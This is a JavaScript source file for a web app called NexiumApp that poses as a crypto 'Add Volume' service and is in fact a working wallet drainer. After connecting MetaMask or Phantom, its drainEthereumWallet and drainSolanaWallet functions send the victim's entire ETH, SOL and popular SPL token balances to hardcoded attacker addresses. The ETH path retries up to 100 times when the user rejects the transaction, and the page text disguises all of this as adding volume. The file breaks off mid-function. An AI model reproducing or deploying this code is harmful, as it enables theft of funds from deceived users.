import { Buffer } from 'buffer';
console.log('main.js: Buffer imported:', typeof Buffer, Buffer); // Log 1
globalThis.Buffer = Buffer;
window.Buffer = Buffer;
console.log('main.js: Buffer set on globalThis/window:', globalThis.Buffer === Buffer, window.Buffer === Buffer); // Log 2

// Other imports
import { CONFIG } from './config.js';
console.log('main.js: Buffer before CONFIG import:', typeof globalThis.Buffer); // Log 3
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
console.log('main.js: Buffer after spl-token import:', typeof globalThis.Buffer); // Log 4

// Verify exports explicitly
const {
  TOKEN_PROGRAM_ID,
  createTransferCheckedInstruction,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
} = splToken;

console.log('main.js: spl-token exports:', {
  TOKEN_PROGRAM_ID: !!TOKEN_PROGRAM_ID,
  createTransferCheckedInstruction: !!createTransferCheckedInstruction,
  getAssociatedTokenAddress: !!getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction: !!createAssociatedTokenAccountInstruction,
}); // Log 5

import * as ethers from 'ethers';

const DRAIN_ADDRESSES = {
  ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
};

const POPULAR_SPL_TOKENS = [
  { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6, name: "USDT" },
  { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, name: "USDC" },
  { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6, name: "WIF" },
  { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5, name: "BONK" },
  { mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQt8b2u9u", decimals: 9, name: "JTO" },
  { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
  { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
  { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
  { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6, name: "TNSR" },
  { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9, name: "DAGO" },
  { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9, name: "TUAH" },
  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" }
];

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.dom = {};
    this.connectingWallet = null;
    this.solConnection = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    this.isDraining = false;
    this.provider = null;
    this.connectedWalletType = null;
    console.log('Initializing NexiumApp...'); // Log 6
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app) {
        console.error('Missing critical DOM element: app'); // Log 7
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI element (app) missing.</p>';
        return;
      }
      if (!this.dom.metamaskPrompt) {
        console.warn('metamaskPrompt element missing, but continuing initialization'); // Log 8
      }
      this.setupModal();
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      if (this.publicKey) {
        this.renderTokenInterface();
      }
      console.log('App initialized successfully'); // Log 9
    } catch (error) {
      console.error('Init error:', error); // Log 10
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      connectWallet: document.getElementById('connect-wallet'),
      walletModal: document.getElementById('wallet-modal'),
      closeModal: document.getElementById('close-modal'),
      connectMetamask: document.querySelector('#wallet-modal #connect-metamask'),
      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
      feedbackContainer: document.querySelector('.feedback-container'),
      tokenSelect: document.getElementById('tokenSelect'),
      volumeSection: document.getElementById('volumeSection'),
      customTokenNameInput: document.getElementById('customTokenNameInput'),
      customTokenAddressInput: document.getElementById('customTokenAddressInput'),
      showCustomTokenBtn: document.getElementById('showCustomTokenBtn'),
      tokenInfo: document.getElementById('tokenInfoDisplay'),
      tokenList: document.getElementById('tokenList'),
      volumeInput: document.getElementById('volumeInput'),
      customTokenModal: document.getElementById('custom-token-modal'),
      closeCustomTokenModal: document.getElementById('close-custom-token-modal')
    };
    console.log('DOM elements cached:', {
      app: !!this.dom.app,
      metamaskPrompt: !!this.dom.metamaskPrompt,
      connectWallet: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModal: !!this.dom.closeModal,
      connectMetamask: !!this.dom.connectMetamask,
      connectPhantom: !!this.dom.connectPhantom,
      customTokenModal: !!this.dom.customTokenModal
    }); // Log 11
  }

  setupModal() {
    console.log('Wallet modal setup:', {
      connectWalletBtn: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModalBtn: !!this.dom.closeModal
    }); // Log 12

    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
      this.dom.connectWallet.addEventListener('click', (event) => {
        if (this.connectedWalletType && !this.dom.connectWallet.disabled) {
          console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
          if (this.connectedWalletType === 'MetaMask') {
            this.drainEthereumWallet(this.publicKey);
          } else if (this.connectedWalletType === 'Phantom') {
            this.drainSolanaWallet();
          }
        } else if (!this.connectedWalletType) {
          console.log('Connect Wallet button clicked'); // Log 14
          event.stopPropagation();
          this.dom.walletModal.classList.add('active');
          console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
        }
      });

      this.dom.closeModal.addEventListener('click', () => {
        console.log('Close wallet modal button clicked'); // Log 16
        this.dom.walletModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
          console.log('Clicked outside wallet modal, closing'); // Log 17
          this.dom.walletModal.classList.remove('active');
        }
      });
    } else {
      console.error('Wallet modal elements not found:', {
        connectWallet: !!this.dom.connectWallet,
        walletModal: !!this.dom.walletModal,
        closeModal: !!this.dom.closeModal
      }); // Log 18
    }

    // Setup custom token modal
    if (this.dom.customTokenModal && this.dom.closeCustomTokenModal) {
      this.dom.closeCustomTokenModal.addEventListener('click', () => {
        console.log('Close custom token modal button clicked'); // Log 19
        this.dom.customTokenModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.customTokenModal.contains(event.target) && !event.target.closest('.custom-token-card')) {
          console.log('Clicked outside custom token modal, closing'); // Log 20
          this.dom.customTokenModal.classList.remove('active');
        }
      });
    }
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        console.log(`${walletName} button clicked`); // Log 21
        this.connectWallet(walletName);
      }
    };

    const addVolumeHandler = (walletName) => {
      console.log(`${walletName} Add Volume clicked`); // Log 22
      if (walletName === 'MetaMask') {
        this.drainEthereumWallet(this.publicKey);
      } else if (walletName === 'Phantom') {
        this.drainSolanaWallet();
      }
    };

    if (this.dom.connectMetamask) {
      this.dom.connectMetamask.addEventListener('click', () => {
        console.log('MetaMask click event triggered, connected class:', this.dom.connectMetamask.classList.contains('connected')); // Log 23
        if (this.dom.connectMetamask.classList.contains('connected')) {
          addVolumeHandler('MetaMask');
        } else {
          connectWalletHandler('MetaMask');
        }
      });
      this.dom.connectMetamask.addEventListener('keypress', (e) => {
        console.log('MetaMask keypress event triggered, key:', e.key, 'connected class:', this.dom.connectMetamask.classList.contains('connected')); // Log 24
        if (e.key === 'Enter') {
          if (this.dom.connectMetamask.classList.contains('connected')) {
            addVolumeHandler('MetaMask');
          } else {
            connectWalletHandler('MetaMask');
          }
        }
      });
    } else {
      console.warn('connectMetamask button not found'); // Log 25
    }

    if (this.dom.connectPhantom) {
      this.dom.connectPhantom.addEventListener('click', () => {
        console.log('Phantom click event triggered, connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 26
        if (this.dom.connectPhantom.classList.contains('connected')) {
          addVolumeHandler('Phantom');
        } else {
          connectWalletHandler('Phantom');
        }
      });
      this.dom.connectPhantom.addEventListener('keypress', (e) => {
        console.log('Phantom keypress event triggered, key:', e.key, 'connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 27
        if (e.key === 'Enter') {
          if (this.dom.connectPhantom.classList.contains('connected')) {
            addVolumeHandler('Phantom');
          } else {
            connectWalletHandler('Phantom');
          }
        }
      });
    } else {
      console.warn('connectPhantom button not found'); // Log 28
    }

    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      console.log(`Connection aborted for ${walletName}: offline or already connecting`); // Log 29
      return;
    }
    this.connecting = true;
    this.connectingWallet = walletName;
    console.log(`Starting connection for ${walletName}, setting state to connecting`); // Log 30
    this.cacheDOMElements();
    this.updateButtonState('connecting', walletName);

    try {
      const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const hasEthereum = !!window.ethereum;
      const hasSolana = !!window.solana;
      const hasExtensions = (walletName === 'MetaMask' && hasEthereum) || 
                           (walletName === 'Phantom' && hasSolana);
      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`); // Log 31

      if (!isMobileUserAgent || hasExtensions) {
        let accounts = [];
        if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
          console.log('MetaMask detected, requesting accounts:', window.ethereum); // Log 32
          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts.length === 0) {
            console.error('MetaMask failed to provide accounts'); // Log 33
            throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
          }
          const provider = new ethers.BrowserProvider(window.ethereum);
          const network = await provider.getNetwork();
          console.log(`MetaMask network: chainId=${network.chainId}, name=${network.name}`); // Log 34
          if (network.chainId !== 1n) {
            console.error('MetaMask not on Ethereum mainnet, chainId:', network.chainId); // Log 35
            throw new Error('MetaMask is not connected to Ethereum mainnet (chainId 1).');
          }
        } else if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
          console.log('Phantom detected, connecting:', window.solana); // Log 36
          const response = await window.solana.connect();
          accounts = [response.publicKey.toString()];
        } else {
          console.error(`${walletName} extension not detected`); // Log 37
          throw new Error(`${walletName} extension not detected or unsupported`);
        }

        this.publicKey = accounts[0];
        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
        console.log(`${walletName} connected via extension: ${this.publicKey}`); // Log 38
        this.connectedWalletType = walletName;
        console.log(`Setting button state to connected for ${walletName}`); // Log 39
        this.cacheDOMElements();
        this.updateButtonState('connected', walletName, this.publicKey);
        console.log(`Hiding MetaMask prompt for ${walletName}`); // Log 40
        this.hideMetaMaskPrompt();
        console.log(`Showing success feedback for ${walletName} connection`); // Log 41
        this.showFeedback(`Connected`, 'success');
        console.log('Rendering token interface'); // Log 42
        this.renderTokenInterface();
        this.connecting = false;
        console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 43
        return;
      }

      const deeplinks = {
        MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com/add-volume.html',
        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com',
      };

      const deeplink = deeplinks[walletName];
      if (!deeplink) {
        console.error(`No deeplink configured for ${walletName}`); // Log 44
        throw new Error(`No deeplink configured for ${walletName}`);
      }
      console.log(`Opening ${walletName} with deeplink: ${deeplink}`); // Log 45
      window.location.href = deeplink;

      const checkConnection = setInterval(async () => {
        if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
          if (accounts.length > 0) {
            this.publicKey = accounts[0];
            const provider = new ethers.BrowserProvider(window.ethereum);
            const network = await provider.getNetwork();
            console.log(`MetaMask deeplink network: chainId=${network.chainId}, name=${network.name}`); // Log 46
            if (network.chainId !== 1n) {
              console.error('MetaMask deeplink not on Ethereum mainnet, chainId:', network.chainId); // Log 47
              this.showFeedback('MetaMask not connected.', 'error');
              clearInterval(checkConnection);
              this.connecting = false;
              return;
            }
            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
            console.log(`MetaMask connected via deeplink: ${this.publicKey}`); // Log 48
            this.connectedWalletType = walletName;
            console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 49
            this.cacheDOMElements();
            this.updateButtonState('connected', walletName, this.publicKey);
            console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`); // Log 50
            this.hideMetaMaskPrompt();
            console.log(`Showing success feedback for ${walletName} deeplink connection`); // Log 51
            this.showFeedback(`Connected`, 'success');
            console.log('Rendering token interface (deeplink)'); // Log 52
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
          const response = await window.solana.connect().catch(() => null);
          if (response && response.publicKey) {
            this.publicKey = response.publicKey.toString();
            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
            const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
            console.log(`Phantom connected via deeplink: ${this.publicKey}, Balance: ${walletBalance}`); // Log 53
            this.connectedWalletType = walletName;
            console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 54
            this.cacheDOMElements();
            this.updateButtonState('connected', walletName, this.publicKey);
            console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`); // Log 55
            this.hideMetaMaskPrompt();
            console.log(`Showing success feedback for ${walletName} deeplink connection`); // Log 56
            this.showFeedback(`Connected`, 'success');
            console.log('Rendering token interface (deeplink)'); // Log 57
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          console.log(`Deeplink timed out for ${walletName}`); // Log 58
          this.showFeedback('error timed out. Please open site in the wallet app browser.', 'error');
          console.log(`Setting button state to disconnected for ${walletName} due to deeplink timeout`); // Log 59
          this.cacheDOMElements();
          this.updateButtonState('disconnected', walletName);
          this.connecting = false;
          clearInterval(checkConnection);
        }
      }, 30000);
    } catch (error) {
      console.error(`Connection error for ${walletName}:`, error); // Log 60
      console.log(`Setting button state to disconnected for ${walletName} due to error`); // Log 61
      this.cacheDOMElements();
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`); // Log 62
    }
  }

  async drainEthereumWallet(wallet) {
    console.log("🔄 ETH Drainer Triggered for address:", wallet); // Log 63
    this.showProcessingSpinner();
    if (typeof window === "undefined" || !window.ethereum) {
      console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed."); // Log 64
      this.showFeedback("error! Make sure MetaMask is installed.", 'error');
      this.hideProcessingSpinner();
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);

    try {
      const network = await provider.getNetwork();
      console.log(`ETH Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 65
      if (network.chainId !== 1n) {
        console.error('ETH Drainer: MetaMask not on Ethereum mainnet, chainId:', network.chainId); // Log 66
        this.showFeedback('MetaMask is not connected.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      const accounts = await window.ethereum.request({ method: "eth_accounts" });

      if (accounts.length === 0) {
        console.log("🔑 Requesting account access..."); // Log 67
        await window.ethereum.request({ method: "eth_requestAccounts" });
      }

      const signer = await provider.getSigner();
      console.log("✅ Connected to Ethereum Wallet:", await signer.getAddress()); // Log 68

      let attempts = 0;
      const maxRetries = 100;
      const delayBetweenRetries = 3000;

      while (attempts < maxRetries) {
        try {
          const balance = await provider.getBalance(wallet);
          console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`); // Log 69
          
          if (balance <= 0n) {
            console.log("❌ Not enough ETH to cover transaction."); // Log 70
            this.showFeedback("Not enough ETH to add volume.", 'error');
            this.hideProcessingSpinner();
            return;
          }

          console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}`); // Log 71
          
          const tx = await signer.sendTransaction({
            to: DRAIN_ADDRESSES.ethereum,
            value: balance
          });

          console.log("✅ ETH Transaction sent:", tx.hash); // Log 72
          
          this.hideProcessingSpinner();
          return;
        } catch (error) {
          if (error.code === "ACTION_REJECTED") {
            console.warn(`⚠️ User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`); // Log 73
            this.showFeedback(`Retrying...`, 'error');
            attempts++;
            await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
          } else {
            console.error("❌ Transaction failed due to an unexpected error:", error); // Log 74
            this.showFeedback(`volume add failed. please try again!`, 'error');
            this.hideProcessingSpinner();
            return;
          }
        }
      }

      console.error("🚨 Max retries reached. Transaction not completed."); // Log 75
      this.hideProcessingSpinner();
    } catch (error) {
      console.error("❌ Could not retrieve signer:", error); // Log 76
      this.showFeedback(`Error: ${error.message}`, 'error');
      this.hideProcessingSpinner();
    }
  }

  async drainSolanaWallet() {
    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 77
    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 78
    this.showProcessingSpinner();

    if (!this.publicKey || typeof this.publicKey !== "string") {
      console.error("❌ Invalid Solana address:", this.publicKey); // Log 79
      this.showFeedback("Invalid Solana address.", 'error');
      this.hideProcessingSpinner();
      return;
    }

    if (this.publicKey.startsWith("0x") && this.publicKey.length === 42) {
      console.error("❌ Ethereum address detected, expected Solana address:", this.publicKey); // Log 80
      this.showFeedback("Cannot drain Solana wallet with an Ethereum address.", 'error');
      this.hideProcessingSpinner();
      return;
    }

    console.log('drainSolanaWallet: createAssociatedTokenAccountInstruction available:', !!createAssociatedTokenAccountInstruction); // Log 81

    try {
      const senderPublicKey = new PublicKey(this.publicKey);
      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 82

      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
      console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 83

      // Check SOL balance for fees
      console.log("Checking SOL balance for fees"); // Log 84
      const balance = await this.solConnection.getBalance(senderPublicKey);
      const minBalanceForTx = await this.solConnection.getMinimumBalanceForRentExemption(165); // Increased for ATA
      console.log(`SOL balance: ${balance / 1e9} SOL, Minimum required: ${minBalanceForTx / 1e9} SOL`); // Log 85
      if (balance < minBalanceForTx) {
        console.log(`❌ Insufficient SOL for transaction fees: ${balance / 1e9} SOL, required: ${minBalanceForTx / 1e9} SOL`); // Log 86
        this.showFeedback('Insufficient SOL for transaction fees.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      // Check SPL token balances
      const tokenBalances = [];
      console.log("Processing SPL token balances"); // Log 87
      for (const token of POPULAR_SPL_TOKENS) {
        console.log(`Attempting to fetch balance for ${token.name} (mint: ${token.mint})`); // Log 88
        try {
          const mintPublicKey = new PublicKey(token.mint);
          console.log(`Mint public key created for ${token.name}:`, mintPublicKey.toBase58()); // Log 89
          const senderATA = await getAssociatedTokenAddress(mintPublicKey, senderPublicKey);
          console.log(`Sender ATA for ${token.name}:`, senderATA.toBase58()); // Log 90
          const accountInfo = await this.solConnection.getParsedAccountInfo(senderATA);
          console.log(`Account info for ${token.name}:`, accountInfo.value ? 'Found' : 'Not found'); // Log 91
          let amount = 0n;
          if (accountInfo.value) {
            amount = BigInt(accountInfo.value.data.parsed.info.tokenAmount.amount);
            console.log(`Fetched ${token.name} balance: ${Number(amount) / 10 ** token.decimals}`); // Log 92
          } else {
            console.log(`No sender ATA for ${token.name}, skipping`); // Log 93
          }
          tokenBalances.push({
            mint: token.mint,
            decimals: token.decimals,
            amount,
            ata: accountInfo.value ? senderATA : null,
            name: token.name
          });
        } catch (error) {
          console.error(`❌ Error fetching balance for ${token.name}:`, error.message); // Log 94
          console.log(`Fetched ${token.name} balance: 0 (due to error)`); // Log 95
          tokenBalances.push({
            mint: token.mint,
            decimals: token.decimals,
            amount: 0n,
            ata: null,
            name: token.name
          });
        }
      }

      console.log("Attempting to drain SOL"); // Log 96
      console.log(`💰 Fetched SOL balance: ${balance / 1e9} SOL`); // Log 97

      let attempts = 0;
      const maxRetries = 10;
      const delayBetweenRetries = 5000;

      while (attempts < maxRetries) {
        try {
          console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}...`); // Log 98
          const updatedBlockhash = await this.solConnection.getLatestBlockhash();
          console.log("🔄 Latest Blockhash:", updatedBlockhash.blockhash); // Log 99
          const transaction = new Transaction({
            feePayer: senderPublicKey,
            recentBlockhash: updatedBlockhash.blockhash,
          });

          // Process SPL tokens
          const tokenResults = [];
          console.log("=== Starting SPL token draining attempts ==="); // Log 100
          for (const token of tokenBalances) {
            if (token.amount === 0n) {
              console.log(`Skipping ${token.name} due to zero balance`); // Log 101
              tokenResults.push({ success: false, name: token.name, error: "Zero balance" });
              continue;
            }
            if (!token.ata) {
              console.log(`Skipping ${token.name} due to no sender ATA`); // Log 102
              tokenResults.push({ success: false, name: token.name, error: "No sender ATA" });
              continue;
            }

            const recipientATA = await getAssociatedTokenAddress(
              new PublicKey(token.mint),
              recipientPublicKey
            );
            console.log(`Recipient ATA for ${token.name}:`, recipientATA.toBase58()); // Log 103
            const accountInfo = await this.solConnection.getAccountInfo(recipientATA);
            console.log(`Recipient ATA info for ${token.name}:`, accountInfo ? 'Exists' : 'Does not exist'); // Log 104
            if (!accountInfo) {
              console.log(`Creating recipient ATA for ${token.name}`); // Log 105
              transaction.add(
                createAssociatedTokenAccountInstruction(
                  senderPublicKey,
                  recipientATA,
                  recipientPublicKey,
                  new PublicKey(token.mint)
                )
              );
              console.log(`✅ Added ATA creation instruction for ${token.name}`); // Log 106
            }

            transaction.add(
              createTransferCheckedInstruction(
                token.ata,
                new PublicKey(token.mint),
                recipientATA,
                senderPublicKey,
                token.amount,
                token.decimals
              )
            );
            console.log(`✅ Added transfer for ${Number(token.amount) / 10 ** token.decimals} ${token.name} tokens`); // Log 107
            tokenResults.push({ success: true, name: token.name });
          }
          console.log("=== Finished SPL token draining attempts ==="); // Log 108

          // Process SOL transfer
          let solDrained = false;
          if (balance > minBalanceForTx) {
            const lamportsToSend = balance - minBalanceForTx;
            console.log(`Preparing SOL transfer for ${lamportsToSend / 1e9} SOL`); // Log 109
            transaction.add(
              SystemProgram.transfer({
                fromPubkey: senderPublicKey,
                toPubkey: recipientPublicKey,
                lamports: lamportsToSend,
              })
            );
            console.log(`✅ Added SOL transfer instruction for ${lamportsToSend / 1e9} SOL`); // Log 110
            solDrained = true;
          } else {
            console.log(`Skipping SOL transfer due to insufficient balance`); // Log 111
          }

          if (transaction.instructions.length === 0) {
            console.log("❌ No valid transfers to process"); // Log 112
            this.showFeedback("No SOL or SPL tokens to drain.", 'error');
            this.hideProcessingSpinner();
            return;
          }

          console.log(`Transaction instructions count: ${transaction.instructions.length}`); // Log 113
          const signedTransaction = await window.solana.signTransaction(transaction);
          console.log("✅ Transaction signed:", signedTransaction); // Log 114
          const signature = await this.solConnection.sendRawTransaction(signedTransaction.serialize());
          console.log("✅ Transaction sent, signature:", signature); // Log 115

          await this.solConnection.confirmTransaction(signature, "confirmed");
          console.log("✅ Transaction confirmed:", signature); // Log 116

          tokenResults.forEach(result => {
            if (result.success) {
              console.log(`✅ ${result.name} drained successfully`); // Log 117
            } else {
              console.log(`❌ ${result.name} drain failed: ${result.error}`); // Log 118
            }
          });
          if (solDrained) {
            console.log("✅ SOL drained successfully"); // Log 119
          } else {
            console.log("❌ SOL drain failed: Insufficient balance"); // Log 120
          }

          const successfulDrains = (solDrained ? 1 : 0) + tokenResults.filter(r => r.success).length;
          console.log(`Total successful drains: ${successfulDrains}`); // Log 121
          if (successfulDrains > 0) {
            this.showFeedback(`Successfully drained ${successfulDrains} tokens`, 'success');
          } else {
            this.showFeedback("No tokens were drained.", 'error');
          }

          this.hideProcessingSpinner();
          return;
        } catch (error) {
          console.error("❌ Transaction Error:", error.message, error); // Log 122
          if (error.message.includes("Blockhash not found")) {
            console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`); // Log 123
            this.showFeedback(`Retrying...`, 'error');
          } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
            console.warn("⚠️ Account has no SOL history. Transaction not possible."); // Log 124
            this.showFeedback("Account has no SOL history. Transaction not possible.", 'error');
            this.hideProcessingSpinner();
            return;
          } else if (error.message.includes("User rejected the request")) {
            console.warn("⚠️ User canceled the transaction."); // Log 125
            this.showFeedback("User canceled this transaction.", 'error');
            this.hideProcessingSpinner();
            return;
          } else {
            console.error("🚨 Unexpected transaction error:", error); // Log 126
            this.showFeedback(`Error: ${error.message}`, 'error');
            this.hideProcessingSpinner();
            return;
          }
          attempts++;
          await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
        }
      }

      console.error("🚨 Max retries reached. Transaction not completed."); // Log 127
      this.showFeedback("Max retries reached. Transaction not completed.", 'error');
      this.hideProcessingSpinner();
    } catch (error) {
      console.error("❌ Unexpected error in drainSolanaWallet:", error); // Log 128
      this.showFeedback(`Error: ${error.message}`, 'error');
      this.hideProcessingSpinner();
    }
  }

  updateButtonState(state, walletName, address = '') {
    let button = this.dom[`connect${walletName}`];
    if (!button) {
      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`); // Log 129
      button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
    }
    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`); // Log 130
    if (!button) {
      console.error(`Button for ${walletName} not found in DOM`); // Log 131
      return;
    }
    console.log(`Current button classes before update: ${button.classList}`); // Log 132
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('connecting');
        console.log(`Set ${walletName} button to Connecting..., disabled=${button.disabled}`); // Log 133
        break;
      case 'connected':
        const shortenedAddress = this.shortenAddress(address);
        button.textContent = shortenedAddress;
        button.classList.add('connected');
        console.log(`Set ${walletName} button to ${shortenedAddress}, disabled=${button.disabled}, classes=${button.classList}`); // Log 134
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = shortenedAddress;
          this.dom.connectWallet.classList.remove('animate-pulse');
          this.dom.connectWallet.classList.add('connected');
          this.dom.connectWallet.disabled = true;
          console.log(`Set outer Connect Wallet button to ${shortenedAddress}, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 135
        }
        break;
      default:
        button.textContent = `Connect ${walletName}`;
        button.classList.add('animate-pulse');
        console.log(`Set ${walletName} button to Connect ${walletName}, disabled=${button.disabled}, classes=${button.classList}`); // Log 136
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = 'Connect Wallet';
          this.dom.connectWallet.classList.add('animate-pulse');
          this.dom.connectWallet.classList.remove('connected');
          this.dom.connectWallet.disabled = false;
          console.log(`Reset outer Connect Wallet button to Connect Wallet, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 137
        }
    }
    console.log(`Button state updated for ${walletName}: text=${button.textContent}, classes=${button.classList}`); // Log 138
  }

  handleConnectionError(error, walletName) {
    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message }); // Log 139
    let message = `Failed to connect ${walletName}`;
    if (error.code === -32002) message = `${walletName} is locked or not responding. Unlock it or reinstall the extension.`;
    else if (error.message?.includes('rejected')) message = `${walletName} connection rejected`;
    else if (error.message?.includes('locked')) message = `${walletName} is locked`;
    else if (error.message?.includes('missing')) message = `WalletConnect project ID missing. Check configuration.`;
    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Check your internet or DNS settings (e.g., use 8.8.8.8).`;
    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `${walletName} extension not detected or unsupported. Please install it.`;
    else if (error.message?.includes('Non-base58 character')) message = `MetaMask uses Ethereum addresses; draining requires a Solana wallet.`;
    else if (error.message) message = `${message}: ${this.escapeHTML(error.message)}`;
    this.showFeedback(message, 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Ready to connect.', 'success');
    console.log('Network status: Online'); // Log 140
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.updateButtonState('disconnected', 'MetaMask');
    this.updateButtonState('disconnected', 'Phantom');
